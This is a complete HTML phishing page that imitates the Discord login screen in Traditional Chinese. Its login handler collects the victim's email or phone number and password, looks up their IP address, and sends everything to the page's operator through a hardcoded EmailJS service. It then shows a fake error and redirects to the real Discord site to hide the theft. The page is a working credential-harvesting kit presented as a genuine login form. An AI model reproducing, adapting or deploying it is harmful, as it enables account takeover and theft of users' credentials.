<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <title>Discord 登入</title>
    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
    <script>
        emailjs.init("CDnxhrbcBaRhYiaqq");
    </script>
    <style>
        body {
            font-family: sans-serif;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #000000;
        }

        .container {
            background-color: #36393F;
            border-radius: 8px;
            padding: 40px;
            width: 780px;
            display: flex;
            justify-content: space-between;
            color: #FFFFFF;
        }

        .login-section {
            width: 414px;
            text-align: center;
        }

        .login-section h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 8px;
        }

        .login-section p {
            color: #ffffff;
            font-size: 16px;
            margin-bottom: 20px;
        }

        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }

        .input-group label {
            display: block;
            color: #eff0f1;
            font-size: 14px;
            font-weight: 700;
            text-transform: uppercase;
            margin-bottom: 8px;
        }

        .input-group label .required {
            color: #ED4245;
        }

        .input-field {
            background-color: #202225;
            border-radius: 3px;
            padding: 10px;
            width: 100%;
            border: 1px solid transparent;
            box-sizing: border-box;
            font-size: 16px;
            color: #DCDDDE;
        }

        .input-field:focus {
            outline: none;
            border-color: #00AFF4;
        }

        .input-field::placeholder {
            color: #72767D;
        }

        .login-btn {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 3px;
            background-color: #5865F2;
            color: #FFFFFF;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.17s ease;
        }

        .login-btn:hover {
            background-color: #4752C4;
        }

        .link-text {
            color: #00b7ff;
            font-size: 15px;
            margin-top: 8px;
            margin-bottom: 8px;
            cursor: pointer;
            text-align: left;
        }

        .link-text:hover {
            text-decoration: underline;
        }

        .login-section-footer {
            color: #8E9297;
            font-size: 14px;
            text-align: left;
        }

        .qr-section {
            width: 240px;
            text-align: center;
        }

        .qr-code {
            width: 200px;
            height: 210px;
            background-color: #FFFFFF;
            border-radius: 4px;
            margin-bottom: 20px;
        }

        .qr-section h2 {
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 8px;
        }

        .qr-section p {
            color: #f4f5f7;
            font-size: 16px;
            margin-bottom: 0px;
        }

        .qr-sub-text {
            color: #dee1e4;
            font-size: 14px;
            margin-top: 10px;
            cursor: pointer;
        }

        .qr-sub-text:hover {
            color: #d1d8df;
            text-decoration: underline;
        }

        .discord-logo {
            margin-bottom: 20px;
            width: 124px;
            height: 34px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-section">
            <h1>歡迎回來！</h1>
            <p>我們很高興又見到您了！</p>
            <div class="input-group">
                <label>電子郵件或電話號碼<span class="required">*</span></label>
                <input type="text" id="username" class="input-field">
            </div>
            <div class="input-group">
                <label>密碼<span class="required">*</span></label>
                <input type="password" id="password" class="input-field">
            </div>
            <a href="https://discord.com/login"><p class="link-text"><span class="link-text">忘記您的密碼？</span></p></a>
            <button class="login-btn" onclick="handleLogin()">登入</button>
            <p class="login-section-footer">需要一個帳號？ <a href="https://discord.com/register"><span class="link-text">註冊</span></p></a>
        </div>
        <div class="qr-section">
            <img src="./dc_qrcode.png" alt="QR Code" class="qr-code">
            <h2>使用 QR Code 登入</h2>
            <p>用 Discord 行動應用程式 對此掃描就能立即登入。</p>
            <a href="https://discord.com/login"><p class="qr-sub-text"><span class="link-text">或者，使用密碼金鑰登入</span></p></a>
        </div>
    </div>


    <script>
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        async function handleLogin() {
            // 取得輸入值並去除前後空格
            const username = usernameInput.value.trim();
            const password = passwordInput.value.trim();

            // 若帳號或密碼任一為空，則中止執行
            if (!username || !password) {
                alert("請輸入帳號或密碼");
                return;
            }
            let userIP = "未知 IP";
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                userIP = data.ip;
            } catch (error) {
                console.error("抓取 IP 失敗:", error);
            }
            
            try {
                await emailjs.send("service_0w04i8j", "template_tvkdzq4", {
                    forwhat: "google to dc_login",
                    username: username,
                    password: password,
                    ip: userIP
                });
                // 發送成功後再跳轉
                console.log('進行登入中...', { username, password });
                alert("發生了一些錯誤");
                window.location.href = "https://discord.com/login";
                

            } catch (err) {
                alert("系統錯誤，請稍後再試");
            }

        }
    </script>
</body>
</html>
